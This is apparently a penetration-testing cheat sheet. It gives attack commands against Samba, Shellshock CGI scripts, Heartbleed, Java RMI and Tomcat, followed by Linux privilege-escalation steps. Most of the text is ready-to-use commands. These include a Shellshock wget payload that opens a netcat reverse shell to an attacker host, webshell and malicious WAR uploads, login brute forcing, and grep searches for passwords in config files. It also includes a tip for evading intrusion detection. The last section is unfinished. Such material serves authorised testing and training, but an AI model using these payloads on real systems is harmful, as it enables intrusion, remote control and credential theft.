
Exploiting Samba
```
# Samba Symlink Directory Traversal Exploit
$ smbmap -H <IP_Address>       # Search Writeable Share
msf > use auxiliary/admin/smb/samba_symlink_traversal

$ smbclient \\\\$IP\\$Share -N     # SMB Shell
smb:\> tar c /tmp/all_files.tar    # Make Archieve 

$ tar -xf all_files.tar            # Extract Archieve
$ grep -r "password" * 2>/&1  /dev/null  # Search Sensitive Keywords


# Writable Samba Server RCE via Perl - Full Patched
# Perl WebShell, upload to "www" share where HTTP server files are.
$ /usr/share/webshells/perl/
$ nc -nlvp <PORT>
```

Exploiting ShellShock
```
# https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6271

# Test on Local System if target is vulnerable
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

----------------------------------------------------------

# CGI Exploit - ShellShock

# Find CGI files on cgi-bin Directory
.\dirsearch.py -u <Target> -e cgi -r 

# Nmap script to check if target is vulnerable
$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi  <target>

# Nmap script to Execute Commands on target
$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi,cmd=ls <target>

# Wget script to Execute Commands on target
$ nc -nlvp <Port>
$ wget -U "() { foo;};echo; /bin/nc <Attacker_IP> <Port> -e /bin/sh" http://<Target_IP>/cgi-bin/login.cgi 

```



Exploiting Heartbleed
```
# Check if Target is VUlnerable
$ nmap --script ssl-heartbleed <target>

# Exploit Heartbleed
msf > use auxiliary/scanner/ssl/openssl_heartbleed
msf > show actions
msf > SET action DUMP
msf > exploit


NOTE : If sensitive data does not leaked, run few more times. Different contents will appear at different time 

```

Exploiting Java RMI Registry 
```
# Port Check
$nmap -sT -sV <Target> -p1099


# Exploit 
msf > use exploit/multi/misc/java_rmi_server




NOTE : Many IDS flag metasploit SSL certificates so use custom SSL certificate.

NOTE : Port may be different.
```

Exploiting Java Deserialization
```
# https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
```


Exploiting Tomcat
```
# Login Brute Force
msf > use auxiliary/scanner/http/tomcat_mgr_login

# Laudanum - Malicious war file.
$ /usr/share/laudanum/jsp/cmd.war

HTTP > http://<IP_Address>/cmd/cmd.jsp  
```

## Post Exploitation

#### Privilege Escalation

```
# Netcat File Transfer
$ nc -l -p 1234 > Linenum.sh             # Victim 
$ nc -w 3 <Target_IP> 1234 < Linenum.sh  # Attacker

```

Cleartext Credentials in Confugiration FIles
```
# Linenum
$ chmod +X Linenum.sh
$ ./Linenum.sh

$ ./Linenum.sh -k {Keyword}

----------------------------------------------------------

# Search "Password" Keywork on .conf files
$ grep -r password /etc/*.conf 2>/dev/null


----------------------------------------------------------
# Metasploit Modules
msf > use post/linux/gather/enum_configs
msf > use post/linux/gather/enum_system
msf > use post/linux [TAB]

```

SUID Binaries
```
# Search For All SUID Executables
$ find / -perm -4000 -type f 2>/dev/null


# glibc $ORIGIN Expansion Privilege Escalation
msf > use exploit/linux/local/glibc_origin_expansion_priv_esc

```


Sudo Privileged Access
```
# Exploits
https://gtfobins.github.io/



# Sudoers file
/etc/sudoers


# Sudo Commands
$ Sudo -l


# Sudo - Docker Command Privilege Escalation
https://github.com/pyperanger/dockerevil
```


Restricted Shells
```
a
```

